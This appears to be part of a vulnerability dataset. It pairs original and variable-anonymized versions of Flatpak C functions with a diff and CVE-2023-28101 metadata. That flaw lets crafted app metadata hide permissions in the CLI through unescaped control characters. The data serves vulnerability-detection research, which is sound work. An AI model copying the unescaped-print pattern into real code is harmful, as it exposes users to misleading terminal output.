      len = MAX (len, g_utf8_strlen (_(""Origin:""), -1));
      len = MAX (len, g_utf8_strlen (_(""Commit:""), -1));
      len = MAX (len, g_utf8_strlen (_(""Installed:""), -1));
      len = MAX (len, g_utf8_strlen (_(""Subpaths:""), -1));

      flatpak_get_window_size (&rows, &cols);
      width = cols - (len + 1);

      extensions = flatpak_list_extensions (metakey, ref_arch, ref_branch);
      for (l = extensions; l; l = l->next)
        {
          FlatpakExtension *ext = l->data;
          g_autofree const char **ext_subpaths = NULL;
          g_autoptr(GBytes) ext_deploy_data = NULL;
          g_autofree char *formatted = NULL;
          g_autofree char *ext_formatted_size = NULL;
          g_autofree char *formatted_commit = NULL;

          if (ext->is_unmaintained)
            {
              formatted_commit = g_strdup (_(""unmaintained""));
              origin = NULL;
              size = 0;
              ext_formatted_size = g_strdup (_(""unknown""));
              ext_subpaths = NULL;
            }
          else
            {
              ext_deploy_data = flatpak_dir_get_deploy_data (dir, ext->ref, FLATPAK_DEPLOY_VERSION_CURRENT, cancellable, error);
              if (ext_deploy_data == NULL)
                return FALSE;

              commit = flatpak_deploy_data_get_commit (ext_deploy_data);
              formatted_commit = ellipsize_string (commit, width);
              origin = flatpak_deploy_data_get_origin (ext_deploy_data);
              size = flatpak_deploy_data_get_installed_size (ext_deploy_data);
              formatted = g_format_size (size);
              ext_subpaths = flatpak_deploy_data_get_subpaths (ext_deploy_data);
              if (ext_subpaths && ext_subpaths[0] && size > 0)
                ext_formatted_size = g_strconcat (""<"", formatted, NULL);
              else
                ext_formatted_size = g_steal_pointer (&formatted);
            }

          g_print (""\n"");
          print_aligned (len, _(""Extension:""), flatpak_decomposed_get_ref (ext->ref));
          print_aligned (len, _(""ID:""), ext->id);
          print_aligned (len, _(""Origin:""), origin ? origin : ""-"");
          print_aligned (len, _(""Commit:""), formatted_commit);
          print_aligned (len, _(""Installed:""), ext_formatted_size);

          if (ext_subpaths && ext_subpaths[0])
            {
              g_autofree char *s = g_strjoinv ("","", (char **) ext_subpaths);
              print_aligned (len, _(""Subpaths:""), s);
            }
        }

      g_list_free_full (extensions, (GDestroyNotify) flatpak_extension_free);
    }

  return TRUE;
}","gboolean
flatpak_builtin_info (int VAR_0, char **VAR_1, GCancellable *VAR_2, GError **VAR_3)
{
  VAR_4(GOptionContext) VAR_5 = NULL;
  VAR_4(FlatpakDecomposed) VAR_6 = NULL;
  VAR_4(FlatpakDir) VAR_7 = NULL;
  VAR_4(GBytes) VAR_8 = NULL;
  VAR_4(FlatpakDeploy) VAR_9 = NULL;
  VAR_4(GFile) VAR_10 = NULL;
  VAR_4(GKeyFile) VAR_11 = NULL;
  const char *VAR_12 = NULL;
  const char *VAR_13 = NULL;
  const char *VAR_14;
  const char *VAR_15;
  const char *VAR_16;
  const char *VAR_17;
  const char *VAR_18;
  const char *VAR_19;
  const char *VAR_20 = NULL;
  const char *VAR_21 = NULL;
  const char *VAR_22 = NULL;
  guint64 VAR_23;
  gboolean VAR_24 = FALSE;
  gboolean VAR_25 = TRUE;
  FlatpakKinds VAR_26;
  const char *VAR_27;
  g_autofree char *VAR_28 = NULL;
  gboolean VAR_29 = TRUE;
  g_autofree const char **VAR_30 = NULL;
  int VAR_31 = 0;
  int VAR_32, VAR_33;
  int VAR_34;

  VAR_5 = g_option_context_new (_(""NAME [BRANCH] - Get info about an installed app or runtime""));
  g_option_context_set_translation_domain (VAR_5, VAR_35);

  if (!flatpak_option_context_parse (VAR_5, VAR_36, &VAR_0, &VAR_1, VAR_37, NULL, VAR_2, VAR_3))
    return FALSE;

  if (VAR_0 < 2)
    return usage_error (VAR_5, _(""NAME must be specified""), VAR_3);
  VAR_20 = VAR_1[1];

  if (VAR_0 >= 3)
    VAR_21 = VAR_1[2];

  if (VAR_0 > 3)
    return usage_error (VAR_5, _(""Too many arguments""), VAR_3);

  VAR_26 = VAR_38 | VAR_39;

  if (!VAR_40 && !VAR_41 && VAR_42 == NULL)
    VAR_24 = TRUE;

  VAR_7 = flatpak_find_installed_pref (VAR_20, VAR_26, VAR_43, VAR_21,
                                     VAR_24, VAR_40, VAR_41, VAR_42,
                                     &VAR_6, VAR_2, VAR_3);
  if (VAR_7 == NULL)
    return FALSE;

  VAR_8 = flatpak_dir_get_deploy_data (VAR_7, VAR_6, VAR_44, VAR_2, VAR_3);
  if (VAR_8 == NULL)
    return FALSE;

  VAR_9 = flatpak_dir_load_deployed (VAR_7, VAR_6, NULL, VAR_2, VAR_3);
  if (VAR_9 == NULL)
    return FALSE;

  VAR_12 = flatpak_deploy_data_get_commit (VAR_8);
  VAR_13 = flatpak_deploy_data_get_alt_id (VAR_8);
  VAR_22 = flatpak_deploy_data_get_origin (VAR_8);
  VAR_23 = flatpak_deploy_data_get_installed_size (VAR_8);
  VAR_28 = g_format_size (VAR_23);
  VAR_10 = flatpak_deploy_get_dir (VAR_9);
  VAR_27 = flatpak_file_get_path_cached (VAR_10);
  VAR_30 = flatpak_deploy_data_get_subpaths (VAR_8);
  VAR_14 = flatpak_deploy_data_get_eol (VAR_8);
  VAR_15 = flatpak_deploy_data_get_eol_rebase (VAR_8);
  VAR_16 = flatpak_deploy_data_get_appdata_name (VAR_8);
  VAR_17 = flatpak_deploy_data_get_appdata_summary (VAR_8);
  VAR_18 = flatpak_deploy_data_get_appdata_version (VAR_8);
  VAR_19 = flatpak_deploy_data_get_appdata_license (VAR_8);

  VAR_11 = flatpak_deploy_get_metadata (VAR_9);

  if (VAR_45 || VAR_46 || VAR_47 || VAR_48 || VAR_49 || VAR_50 ||
      VAR_51 || VAR_52 || VAR_53 || VAR_54)
    VAR_29 = FALSE;

  if (VAR_29)
    {
      VAR_4(GVariant) VAR_55 = NULL;
      VarMetadataRef VAR_56;
      guint64 VAR_57;
      g_autofree char *VAR_58 = NULL;
      const gchar *VAR_59 = NULL;
      g_autofree char *VAR_60 = NULL;
      g_autofree char *VAR_61 = NULL;
      const char *VAR_62 = NULL;
      const char *VAR_63 = NULL;

      flatpak_get_window_size (&VAR_32, &VAR_33);

      if (VAR_16)
        {
          if (VAR_17)
            print_wrapped (MIN (VAR_33, 80), ""\n%s - %s\n"", VAR_16, VAR_17);
          else
            print_wrapped (MIN (VAR_33, 80), ""\n%s\n"", VAR_16);
        }

      VAR_61 = flatpak_dir_read_latest (VAR_7, VAR_22, flatpak_decomposed_get_ref (VAR_6), NULL, NULL, NULL);
      if (VAR_61 == NULL)
        VAR_61 = g_strdup (_(""ref not present in origin""));

      if (ostree_repo_load_commit (flatpak_dir_get_repo (VAR_7), VAR_12, &VAR_55, NULL, NULL))
        {
          VarCommitRef VAR_64 = var_commit_from_gvariant (VAR_55);

          VAR_59 = var_commit_get_subject (VAR_64);
          VAR_60 = ostree_commit_get_parent (VAR_55);
          VAR_57 = ostree_commit_get_timestamp (VAR_55);

          VAR_58 = format_timestamp (VAR_57);

          VAR_56 = var_commit_get_metadata (VAR_64);
          VAR_62 = var_metadata_lookup_string (VAR_56, ""xa.metadata"", NULL);
          if (VAR_62 == NULL)
            g_printerr (_(""Warning: Commit has no flatpak metadata\n""));

          VAR_63 = var_metadata_lookup_string (VAR_56, ""ostree.collection-binding"", NULL);
        }

      VAR_31 = 0;
      VAR_31 = MAX (VAR_31, g_utf8_strlen (_(""ID:""), -1));
      VAR_31 = MAX (VAR_31, g_utf8_strlen (_(""Ref:""), -1));
      VAR_31 = MAX (VAR_31, g_utf8_strlen (_(""Arch:""), -1));
      VAR_31 = MAX (VAR_31, g_utf8_strlen (_(""Branch:""), -1));
      if (VAR_18)
        VAR_31 = MAX (VAR_31, g_utf8_strlen (_(""Version:""), -1));
      if (VAR_19)
        VAR_31 = MAX (VAR_31, g_utf8_strlen (_(""License:""), -1));
      if (VAR_63 != NULL)
        VAR_31 = MAX (VAR_31, g_utf8_strlen (_(""Collection:""), -1));
      VAR_31 = MAX (VAR_31, g_utf8_strlen (_(""Installation:""), -1));
      VAR_31 = MAX (VAR_31, g_utf8_strlen (_(""Installed:""), -1));
      if (flatpak_decomposed_is_app (VAR_6))
        {
          VAR_31 = MAX (VAR_31, g_utf8_strlen (_(""Runtime:""), -1));
          VAR_31 = MAX (VAR_31, g_utf8_strlen (_(""Sdk:""), -1));
        }
      if (VAR_58)
        VAR_31 = MAX (VAR_31, g_utf8_strlen (_(""Date:""), -1));
      if (VAR_59)
        VAR_31 = MAX (VAR_31, g_utf8_strlen (_(""Subject:""), -1));
      if (strcmp (VAR_12, VAR_61) != 0)
        {
          VAR_31 = MAX (VAR_31, g_utf8_strlen (_(""Active commit:""), -1));
          VAR_31 = MAX (VAR_31, g_utf8_strlen (_(""Latest commit:""), -1));
        }
      else
        VAR_31 = MAX (VAR_31, g_utf8_strlen (_(""Commit:""), -1));
      if (VAR_60)
        VAR_31 = MAX (VAR_31, g_utf8_strlen (_(""Parent:""), -1));
      if (VAR_13)
        VAR_31 = MAX (VAR_31, g_utf8_strlen (_(""Alt-id:""), -1));
      if (VAR_14)
        VAR_31 = MAX (VAR_31, g_utf8_strlen (_(""End-of-life:""), -1));
      if (VAR_15)
        VAR_31 = MAX (VAR_31, g_utf8_strlen (_(""End-of-life-rebase:""), -1));
      if (VAR_30[0] != NULL)
        VAR_31 = MAX (VAR_31, g_utf8_strlen (_(""Subdirectories:""), -1));
      VAR_31 = MAX (VAR_31, g_utf8_strlen (_(""Extension:""), -1));

      VAR_34 = VAR_33 - (VAR_31 + 1);

      print_aligned_take (VAR_31, _(""ID:""), flatpak_decomposed_dup_id (VAR_6));
      print_aligned (VAR_31, _(""Ref:""), flatpak_decomposed_get_ref (VAR_6));
      print_aligned_take (VAR_31, _(""Arch:""), flatpak_decomposed_dup_arch (VAR_6));
      print_aligned_take (VAR_31, _(""Branch:""), flatpak_decomposed_dup_branch (VAR_6));
      if (VAR_18)
        print_aligned (VAR_31, _(""Version:""), VAR_18);
      if (VAR_19)
        print_aligned (VAR_31, _(""License:""), VAR_19);
      print_aligned (VAR_31, _(""Origin:""), VAR_22 ? VAR_22 : ""-"");
      if (VAR_63)
        print_aligned (VAR_31, _(""Collection:""), VAR_63);
      print_aligned (VAR_31, _(""Installation:""), flatpak_dir_get_name_cached (VAR_7));
      print_aligned (VAR_31, _(""Installed:""), VAR_28);
      if (flatpak_decomposed_is_app (VAR_6))
        {
          g_autofree char *VAR_65 = NULL;
          VAR_65 = g_key_file_get_string (VAR_11,
                                           VAR_66,
                                           VAR_67,
                                           VAR_3);
          print_aligned (VAR_31, _(""Runtime:""), VAR_65 ? VAR_65 : ""-"");
        }
      if (flatpak_decomposed_is_app (VAR_6))
        {
          g_autofree char *VAR_68 = NULL;
          VAR_68 = g_key_file_get_string (VAR_11,
                                       VAR_66,
                                       VAR_69,
                                       VAR_3);
          print_aligned (VAR_31, _(""Sdk:""), VAR_68 ? VAR_68 : ""-"");
        }
      g_print (""\n"");

      if (strcmp (VAR_12, VAR_61) != 0)
        {
          g_autofree char *VAR_70 = ellipsize_string (VAR_12, VAR_34);
          print_aligned (VAR_31, _(""Active commit:""), VAR_70);
          g_free (VAR_70);
          VAR_70 = ellipsize_string (VAR_61, VAR_34);
          print_aligned (VAR_31, _(""Latest commit:""), VAR_70);
        }
      else
        {
          g_autofree char *VAR_70 = ellipsize_string (VAR_12, VAR_34);
          print_aligned (VAR_31, _(""Commit:""), VAR_70);
        }
      if (VAR_60)
        {
          g_autofree char *VAR_70 = ellipsize_string (VAR_60, VAR_34);
          print_aligned (VAR_31, _(""Parent:""), VAR_70);
        }
      if (VAR_59)
        print_aligned (VAR_31, _(""Subject:""), VAR_59);
      if (VAR_58)
        print_aligned (VAR_31, _(""Date:""), VAR_58);
      if (VAR_30[0] != NULL)
        {
          g_autofree char *VAR_71 = g_strjoinv ("","", (char **) VAR_30);
          print_aligned (VAR_31, _(""Subdirectories:""), VAR_71);
        }

      if (VAR_13)
        print_aligned (VAR_31, _(""Alt-id:""), VAR_13);
      if (VAR_14)
        {
          g_autofree char *VAR_72 = ellipsize_string (VAR_14, VAR_34);
          print_aligned (VAR_31, _(""End-of-life:""), VAR_72);
        }
      if (VAR_15)
        {
          g_autofree char *VAR_72 = ellipsize_string (VAR_15, VAR_34);
          print_aligned (VAR_31, _(""End-of-life-rebase:""), VAR_72);
        }
    }
  else
    {
      if (VAR_45)
        {
          maybe_print_space (&VAR_25);
          g_print (""%s"", flatpak_decomposed_get_ref (VAR_6));
        }

      if (VAR_46)
        {
          maybe_print_space (&VAR_25);
          g_print (""%s"", VAR_22 ? VAR_22 : ""-"");
        }

      if (VAR_47)
        {
          maybe_print_space (&VAR_25);
          g_print (""%s"", VAR_12);
        }

      if (VAR_48)
        {
          maybe_print_space (&VAR_25);
          g_print (""%"" VAR_73, VAR_23);
        }

      if (VAR_52)
        {
          maybe_print_space (&VAR_25);
          g_print (""%s"", VAR_27);
        }

      if (VAR_53)
        {
          g_autofree char *VAR_65 = NULL;
          maybe_print_space (&VAR_25);

          VAR_65 = g_key_file_get_string (VAR_11,
                                           flatpak_decomposed_get_kind_metadata_group (VAR_6),
                                           VAR_67,
                                           NULL);
          g_print (""%s"", VAR_65 ? VAR_65 : ""-"");
        }

      if (VAR_54)
        {
          g_autofree char *VAR_68 = NULL;
          maybe_print_space (&VAR_25);

          VAR_68 = g_key_file_get_string (VAR_11,
                                       flatpak_decomposed_get_kind_metadata_group (VAR_6),
                                       VAR_69,
                                       NULL);
          g_print (""%s"", VAR_68 ? VAR_68 : ""-"");
        }

      if (!VAR_25)
        g_print (""\n"");

      if (VAR_49)
        {
          VAR_4(GFile) VAR_74 = NULL;
          g_autofree char *VAR_75 = NULL;
          gsize VAR_76;

          VAR_74 = g_file_get_child (VAR_10, ""metadata"");

          if (!g_file_load_contents (VAR_74, VAR_2, &VAR_75, &VAR_76, NULL, VAR_3))
            return FALSE;

          flatpak_print_escaped_string (VAR_75,
                                        VAR_77
                                        | VAR_78);
        }

      if (VAR_50 || VAR_51)
        {
          VAR_4(FlatpakContext) VAR_79 = NULL;
          VAR_4(GKeyFile) VAR_80 = NULL;
          g_autofree gchar *VAR_81 = NULL;

          VAR_79 = flatpak_context_load_for_deploy (VAR_9, VAR_3);
          if (VAR_79 == NULL)
            return FALSE;

          if (VAR_50)
            {
              VAR_80 = g_key_file_new ();
              flatpak_context_save_metadata (VAR_79, TRUE, VAR_80);
              VAR_81 = g_key_file_to_data (VAR_80, NULL, VAR_3);
              if (VAR_81 == NULL)
                return FALSE;

              flatpak_print_escaped_string (VAR_81,
                                            VAR_77
                                            | VAR_78);
            }

          if (VAR_51)
            {
              g_autofree char *VAR_82 = flatpak_decomposed_dup_id (VAR_6);
              VAR_4(FlatpakExports) VAR_83 = flatpak_context_get_exports (VAR_79, VAR_82);
              FlatpakFilesystemMode VAR_84;

              VAR_84 = flatpak_exports_path_get_mode (VAR_83, VAR_51);
              if (VAR_84 == 0)
                g_print (""hidden\n"");
              else if (VAR_84 == VAR_85)
                g_print (""read-only\n"");
              else
                g_print (""read-write\n"");
            }
        }
    }

  if (VAR_86)
    {
      GList *VAR_87, *VAR_88;
      g_autofree char *VAR_89 = flatpak_decomposed_dup_arch (VAR_6);
      g_autofree char *VAR_90 = flatpak_decomposed_dup_branch (VAR_6);

      VAR_31 = MAX (VAR_31, g_utf8_strlen (_(""Extension:""), -1));
      VAR_31 = MAX (VAR_31, g_utf8_strlen (_(""ID:""), -1));
      VAR_31 = MAX (VAR_31, g_utf8_strlen (_(""Origin:""), -1));
      VAR_31 = MAX (VAR_31, g_utf8_strlen (_(""Commit:""), -1));
      VAR_31 = MAX (VAR_31, g_utf8_strlen (_(""Installed:""), -1));
      VAR_31 = MAX (VAR_31, g_utf8_strlen (_(""Subpaths:""), -1));

      flatpak_get_window_size (&VAR_32, &VAR_33);
      VAR_34 = VAR_33 - (VAR_31 + 1);

      VAR_87 = flatpak_list_extensions (VAR_11, VAR_89, VAR_90);
      for (VAR_88 = VAR_87; VAR_88; VAR_88 = VAR_88->next)
        {
          FlatpakExtension *VAR_91 = VAR_88->data;
          g_autofree const char **VAR_92 = NULL;
          VAR_4(GBytes) VAR_93 = NULL;
          g_autofree char *VAR_94 = NULL;
          g_autofree char *VAR_95 = NULL;
          g_autofree char *VAR_70 = NULL;

          if (VAR_91->is_unmaintained)
            {
              VAR_70 = g_strdup (_(""unmaintained""));
              VAR_22 = NULL;
              VAR_23 = 0;
              VAR_95 = g_strdup (_(""unknown""));
              VAR_92 = NULL;
            }
          else
            {
              VAR_93 = flatpak_dir_get_deploy_data (VAR_7, VAR_91->ref, VAR_44, VAR_2, VAR_3);
              if (VAR_93 == NULL)
                return FALSE;

              VAR_12 = flatpak_deploy_data_get_commit (VAR_93);
              VAR_70 = ellipsize_string (VAR_12, VAR_34);
              VAR_22 = flatpak_deploy_data_get_origin (VAR_93);
              VAR_23 = flatpak_deploy_data_get_installed_size (VAR_93);
              VAR_94 = g_format_size (VAR_23);
              VAR_92 = flatpak_deploy_data_get_subpaths (VAR_93);
              if (VAR_92 && VAR_92[0] && VAR_23 > 0)
                VAR_95 = g_strconcat (""<"", VAR_94, NULL);
              else
                VAR_95 = g_steal_pointer (&VAR_94);
            }

          g_print (""\n"");
          print_aligned (VAR_31, _(""Extension:""), flatpak_decomposed_get_ref (VAR_91->ref));
          print_aligned (VAR_31, _(""ID:""), VAR_91->id);
          print_aligned (VAR_31, _(""Origin:""), VAR_22 ? VAR_22 : ""-"");
          print_aligned (VAR_31, _(""Commit:""), VAR_70);
          print_aligned (VAR_31, _(""Installed:""), VAR_95);

          if (VAR_92 && VAR_92[0])
            {
              g_autofree char *VAR_71 = g_strjoinv ("","", (char **) VAR_92);
              print_aligned (VAR_31, _(""Subpaths:""), VAR_71);
            }
        }

      g_list_free_full (VAR_87, (GDestroyNotify) VAR_96);
    }

  return TRUE;
}",flatpak/6cac99dafe6003c8a4bd5666341c217876536869/flatpak-builtins-info.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -318,7 +318,9 @@
           if (!g_file_load_contents (file, cancellable, &data, &data_size, NULL, error))
             return FALSE;
 
-          g_print (""%s"", data);
+          flatpak_print_escaped_string (data,
+                                        FLATPAK_ESCAPE_ALLOW_NEWLINES
+                                        | FLATPAK_ESCAPE_DO_NOT_QUOTE);
         }
 
       if (opt_show_permissions || opt_file_access)
@@ -339,7 +341,9 @@
               if (contents == NULL)
                 return FALSE;
 
-              g_print (""%s"", contents);
+              flatpak_print_escaped_string (contents,
+                                            FLATPAK_ESCAPE_ALLOW_NEWLINES
+                                            | FLATPAK_ESCAPE_DO_NOT_QUOTE);
             }
 
           if (opt_file_access)","{'deleted_lines': ['          g_print (""%s"", data);', '              g_print (""%s"", contents);'], 'added_lines': ['          flatpak_print_escaped_string (data,', '                                        FLATPAK_ESCAPE_ALLOW_NEWLINES', '                                        | FLATPAK_ESCAPE_DO_NOT_QUOTE);', '              flatpak_print_escaped_string (contents,', '                                            FLATPAK_ESCAPE_ALLOW_NEWLINES', '                                            | FLATPAK_ESCAPE_DO_NOT_QUOTE);']}",True,"Flatpak is a system for building, distributing, and running sandboxed desktop applications on Linux. In versions prior to 1.10.8, 1.12.8, 1.14.4, and 1.15.4, if an attacker publishes a Flatpak app with elevated permissions, they can hide those permissions from users of the `flatpak(1)` command-line interface by setting other permissions to crafted values that contain non-printable control characters such as `ESC`. A fix is available in versions 1.10.8, 1.12.8, 1.14.4, and 1.15.4. As a workaround, use a GUI like GNOME Software rather than the command-line interface, or only install apps whose maintainers you trust.",5.0,MEDIUM,1,valid,2023-03-04T22:23:37Z,4
CVE-2023-28101,['CWE-116'],CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N,1,flatpak,"Reject paths given to --filesystem/--persist with special characters

There isn't much in the way of legit reasons for this, but it's a
potential security footgun when displaying the text.

CVE-2023-28101, GHSA-h43h-fwqx-mpp8

Signed-off-by: Ryan Gonzalez <ryan.gonzalez@collabora.com>
Co-authored-by: Simon McVittie <smcv@collabora.com>",7fe63f2e8f1fd2dafc31d45154cf0b191ebec66c,https://github.com/flatpak/flatpak/commit/7fe63f2e8f1fd2dafc31d45154cf0b191ebec66c,common/flatpak-context.c,flatpak_context_load_metadata,"gboolean
flatpak_context_load_metadata (FlatpakContext *context,
GKeyFile       *metakey,
GError        **error)
{
gboolean remove;
g_auto(GStrv) groups = NULL;
gsize i;
if (g_key_file_has_key (metakey, FLATPAK_METADATA_GROUP_CONTEXT, FLATPAK_METADATA_KEY_SHARED, NULL))
{
g_auto(GStrv) shares = g_key_file_get_string_list (metakey, FLATPAK_METADATA_GROUP_CONTEXT,
FLATPAK_METADATA_KEY_SHARED, NULL, error);
if (shares == NULL)
return FALSE;
for (i = 0; shares[i] != NULL; i++)
{
FlatpakContextShares share;
share = flatpak_context_share_from_string (parse_negated (shares[i], &remove), NULL);
if (share == 0)
g_info (""Unknown share type %s"", shares[i]);
else
{
if (remove)
flatpak_context_remove_shares (context, share);
else
flatpak_context_add_shares (context, share);
}
}
}
if (g_key_file_has_key (metakey, FLATPAK_METADATA_GROUP_CONTEXT, FLATPAK_METADATA_KEY_SOCKETS, NULL))
{
g_auto(GStrv) sockets = g_key_file_get_string_list (metakey, FLATPAK_METADATA_GROUP_CONTEXT,
FLATPAK_METADATA_KEY_SOCKETS, NULL, error);
if (sockets == NULL)
return FALSE;
for (i = 0; sockets[i] != NULL; i++)
{
FlatpakContextSockets socket = flatpak_context_socket_from_string (parse_negated (sockets[i], &remove), NULL);
if (socket == 0)
g_info (""Unknown socket type %s"", sockets[i]);
else
{
if (remove)
flatpak_context_remove_sockets (context, socket);
else
flatpak_context_add_sockets (context, socket);
}
}
}
if (g_key_file_has_key (metakey, FLATPAK_METADATA_GROUP_CONTEXT, FLATPAK_METADATA_KEY_DEVICES, NULL))
{
g_auto(GStrv) devices = g_key_file_get_string_list (metakey, FLATPAK_METADATA_GROUP_CONTEXT,
FLATPAK_METADATA_KEY_DEVICES, NULL, error);
if (devices == NULL)
return FALSE;
for (i = 0; devices[i] != NULL; i++)
{
FlatpakContextDevices device = flatpak_context_device_from_string (parse_negated (devices[i], &remove), NULL);
if (device == 0)
g_info (""Unknown device type %s"", devices[i]);
else
{
if (remove)
flatpak_context_remove_devices (context, device);
else
flatpak_context_add_devices (context, device);
}
}
}
if (g_key_file_has_key (metakey, FLATPAK_METADATA_GROUP_CONTEXT, FLATPAK_METADATA_KEY_FEATURES, NULL))
{
g_auto(GStrv) features = g_key_file_get_string_list (metakey, FLATPAK_METADATA_GROUP_CONTEXT,
FLATPAK_METADATA_KEY_FEATURES, NULL, error);
if (features == NULL)
return FALSE;
for (i = 0; features[i] != NULL; i++)
{
FlatpakContextFeatures feature = flatpak_context_feature_from_string (parse_negated (features[i], &remove), NULL);
if (feature == 0)
g_info (""Unknown feature type %s"", features[i]);
else
{
if (remove)
flatpak_context_remove_features (context, feature);
else
flatpak_context_add_features (context, feature);
}
}
}
if (g_key_file_has_key (metakey, FLATPAK_METADATA_GROUP_CONTEXT, FLATPAK_METADATA_KEY_FILESYSTEMS, NULL))
{
g_auto(GStrv) filesystems = g_key_file_get_string_list (metakey, FLATPAK_METADATA_GROUP_CONTEXT,
FLATPAK_METADATA_KEY_FILESYSTEMS, NULL, error);
if (filesystems == NULL)
return FALSE;
for (i = 0; filesystems[i] != NULL; i++)
{
const char *fs = parse_negated (filesystems[i], &remove);
g_autofree char *filesystem = NULL;
FlatpakFilesystemMode mode;
if (!flatpak_context_parse_filesystem (fs, remove,
&filesystem, &mode, NULL))
g_info (""Unknown filesystem type %s"", filesystems[i]);
else
{
g_assert (mode == FLATPAK_FILESYSTEM_MODE_NONE || !remove);
flatpak_context_take_filesystem (context, g_steal_pointer (&filesystem), mode);
}
}
}
if (g_key_file_has_key (metakey, FLATPAK_METADATA_GROUP_CONTEXT, FLATPAK_METADATA_KEY_PERSISTENT, NULL))
{
g_auto(GStrv) persistent = g_key_file_get_string_list (metakey, FLATPAK_METADATA_GROUP_CONTEXT,
FLATPAK_METADATA_KEY_PERSISTENT, NULL, error);
if (persistent == NULL)
return FALSE;
for (i = 0; persistent[i] != NULL; i++)
flatpak_context_set_persistent (context, persistent[i]);
}
if (g_key_file_has_group (metakey, FLATPAK_METADATA_GROUP_SESSION_BUS_POLICY))
{
g_auto(GStrv) keys = NULL;
gsize keys_count;
keys = g_key_file_get_keys (metakey, FLATPAK_METADATA_GROUP_SESSION_BUS_POLICY, &keys_count, NULL);
for (i = 0; i < keys_count; i++)
{
const char *key = keys[i];
g_autofree char *value = g_key_file_get_string (metakey, FLATPAK_METADATA_GROUP_SESSION_BUS_POLICY, key, NULL);
FlatpakPolicy policy;
if (!flatpak_verify_dbus_name (key, error))
return FALSE;
policy = flatpak_policy_from_string (value, NULL);
if ((int) policy != -1)
flatpak_context_set_session_bus_policy (context, key, policy);
}
}
if (g_key_file_has_group (metakey, FLATPAK_METADATA_GROUP_SYSTEM_BUS_POLICY))
{
g_auto(GStrv) keys = NULL;
gsize keys_count;
keys = g_key_file_get_keys (metakey, FLATPAK_METADATA_GROUP_SYSTEM_BUS_POLICY, &keys_count, NULL);
for (i = 0; i < keys_count; i++)
{
const char *key = keys[i];
g_autofree char *value = g_key_file_get_string (metakey, FLATPAK_METADATA_GROUP_SYSTEM_BUS_POLICY, key, NULL);
FlatpakPolicy policy;
if (!flatpak_verify_dbus_name (key, error))
return FALSE;
policy = flatpak_policy_from_string (value, NULL);
if ((int) policy != -1)
flatpak_context_set_system_bus_policy (context, key, policy);
}
}
if (g_key_file_has_group (metakey, FLATPAK_METADATA_GROUP_ENVIRONMENT))
{
g_auto(GStrv) keys = NULL;
gsize keys_count;
keys = g_key_file_get_keys (metakey, FLATPAK_METADATA_GROUP_ENVIRONMENT, &keys_count, NULL);
for (i = 0; i < keys_count; i++)
{
const char *key = keys[i];
g_autofree char *value = g_key_file_get_string (metakey, FLATPAK_METADATA_GROUP_ENVIRONMENT, key, NULL);
flatpak_context_set_env_var (context, key, value);
}
}
if (g_key_file_has_key (metakey, FLATPAK_METADATA_GROUP_CONTEXT, FLATPAK_METADATA_KEY_UNSET_ENVIRONMENT, NULL))
{
g_auto(GStrv) vars = NULL;
gsize vars_count;
vars = g_key_file_get_string_list (metakey, FLATPAK_METADATA_GROUP_CONTEXT,
FLATPAK_METADATA_KEY_UNSET_ENVIRONMENT,
&vars_count, error);
if (vars == NULL)
return FALSE;
for (i = 0; i < vars_count; i++)
{
const char *var = vars[i];
flatpak_context_set_env_var (context, var, NULL);
}
}
groups = g_key_file_get_groups (metakey, NULL);
for (i = 0; groups[i] != NULL; i++)
{
const char *group = groups[i];
const char *subsystem;
int j;
if (g_str_has_prefix (group, FLATPAK_METADATA_GROUP_PREFIX_POLICY))
{
g_auto(GStrv) keys = NULL;
subsystem = group + strlen (FLATPAK_METADATA_GROUP_PREFIX_POLICY);
keys = g_key_file_get_keys (metakey, group, NULL, NULL);
for (j = 0; keys != NULL && keys[j] != NULL; j++)
{
const char *key = keys[j];
g_autofree char *policy_key = g_strdup_printf (""%s.%s"", subsystem, key);
g_auto(GStrv) values = NULL;
int k;
values = g_key_file_get_string_list (metakey, group, key, NULL, NULL);
for (k = 0; values != NULL && values[k] != NULL; k++)
flatpak_context_apply_generic_policy (context, policy_key,
values[k]);
}
}
}
return TRUE;
}","gboolean
flatpak_context_load_metadata (FlatpakContext *VAR_0,
GKeyFile       *VAR_1,
GError        **VAR_2)
{
gboolean VAR_3;
VAR_4(GStrv) VAR_5 = NULL;
gsize VAR_6;
if (g_key_file_has_key (VAR_1, VAR_7, VAR_8, NULL))
{
VAR_4(GStrv) VAR_9 = g_key_file_get_string_list (VAR_1, VAR_7,
VAR_8, NULL, VAR_2);
if (VAR_9 == NULL)
return FALSE;
for (VAR_6 = 0; VAR_9[VAR_6] != NULL; VAR_6++)
{
FlatpakContextShares VAR_10;
VAR_10 = flatpak_context_share_from_string (parse_negated (VAR_9[VAR_6], &VAR_3), NULL);
if (VAR_10 == 0)
g_info (""Unknown share type %s"", VAR_9[VAR_6]);
else
{
if (VAR_3)
flatpak_context_remove_shares (VAR_0, VAR_10);
else
flatpak_context_add_shares (VAR_0, VAR_10);
}
}
}
if (g_key_file_has_key (VAR_1, VAR_7, VAR_11, NULL))
{
VAR_4(GStrv) VAR_12 = g_key_file_get_string_list (VAR_1, VAR_7,
VAR_11, NULL, VAR_2);
if (VAR_12 == NULL)
return FALSE;
for (VAR_6 = 0; VAR_12[VAR_6] != NULL; VAR_6++)
{
FlatpakContextSockets VAR_13 = flatpak_context_socket_from_string (parse_negated (VAR_12[VAR_6], &VAR_3), NULL);
if (VAR_13 == 0)
g_info (""Unknown socket type %s"", VAR_12[VAR_6]);
else
{
if (VAR_3)
flatpak_context_remove_sockets (VAR_0, VAR_13);
else
flatpak_context_add_sockets (VAR_0, VAR_13);
}
}
}
if (g_key_file_has_key (VAR_1, VAR_7, VAR_14, NULL))
{
VAR_4(GStrv) VAR_15 = g_key_file_get_string_list (VAR_1, VAR_7,
VAR_14, NULL, VAR_2);
if (VAR_15 == NULL)
return FALSE;
for (VAR_6 = 0; VAR_15[VAR_6] != NULL; VAR_6++)
{
FlatpakContextDevices VAR_16 = flatpak_context_device_from_string (parse_negated (VAR_15[VAR_6], &VAR_3), NULL);
if (VAR_16 == 0)
g_info (""Unknown device type %s"", VAR_15[VAR_6]);
else
{
if (VAR_3)
flatpak_context_remove_devices (VAR_0, VAR_16);
else
flatpak_context_add_devices (VAR_0, VAR_16);
}
}
}
if (g_key_file_has_key (VAR_1, VAR_7, VAR_17, NULL))
{
VAR_4(GStrv) VAR_18 = g_key_file_get_string_list (VAR_1, VAR_7,
VAR_17, NULL, VAR_2);
if (VAR_18 == NULL)
return FALSE;
